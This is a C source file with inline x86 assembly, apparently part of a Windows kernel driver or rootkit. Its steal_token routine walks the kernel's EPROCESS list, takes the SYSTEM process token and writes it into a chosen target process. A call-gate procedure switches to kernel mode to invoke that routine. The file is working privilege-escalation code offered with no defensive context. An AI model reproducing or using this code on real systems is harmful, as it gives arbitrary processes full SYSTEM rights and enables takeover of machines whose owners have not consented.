#include "callgate_procedure.h"

DWORD steal_token(DWORD TARGET_PID, DWORD SOURCE_PID)
{
	char res = 0;
#if defined(DEBUG)
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "CallGate - TARGET_PID: %d | SOURCE_PID: %d\n", TARGET_PID, SOURCE_PID);
#endif
	// TOKEN STEALER X86 ASM
	__asm
	{
	Start:
		pushad
			mov eax, fs : [KTHREAD_OFFSET]
			mov eax, [eax + EPROCESS_OFFSET]
			mov ecx, eax                            // Copy current _EPROCESS structure
			mov ebx, [eax + TOKEN_OFFSET]           // Copy current nt!_EPROCESS.Token
			mov edx, SOURCE_PID                     // Process PID = 0x4
			SearchSystemPID :
		mov eax, [eax + FLINK_OFFSET]				// Get nt!_EPROCESS.ActiveProcessLinks.Flink
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx              // Get nt!_EPROCESS.UniqueProcessId
			jne SearchSystemPID
			mov edx, [eax + TOKEN_OFFSET]           // Get SYSTEM process nt!_EPROCESS.Token
			mov esi, eax
			SearchProcessPID :
		mov ecx, eax
			mov edi, [eax + PID_OFFSET]
			mov eax, [eax + FLINK_OFFSET]			//ebx - Next _EPROCESS
			sub eax, FLINK_OFFSET
			cmp eax, esi
			jz Stop
			cmp edi, [TARGET_PID]
			jz SetToken
			jmp SearchProcessPID
			SetToken :
		mov[ecx + TOKEN_OFFSET], edx
			mov[res], 1
			Stop :
			popad
	}
	return res;
}

// INPUT STACK PARAMS:
//  SOURCE_PID		[esp+12]
//	TARGET_PID		[esp+8]
//	CS SELECTOR		[esp+4]
//	RETADDR			[esp]
__declspec(naked) ULONG_PTR call_gate_proc() {
	__asm
	{
		// prolog
		push ebp
		mov ebp, esp

		push fs					// Save the value of FS
		mov ax, 0x30			// Set FS to kernel mode value
		mov fs, ax

		mov eax, [ebp + 16]		// SOURCE_PID
		push eax
		mov eax, [ebp + 12]		// TARGET_PID
		push eax 
		call steal_token

		pop fs					// Restore the value of FS

		// epilog
		mov esp, ebp
		pop ebp
		retf 8
	}
}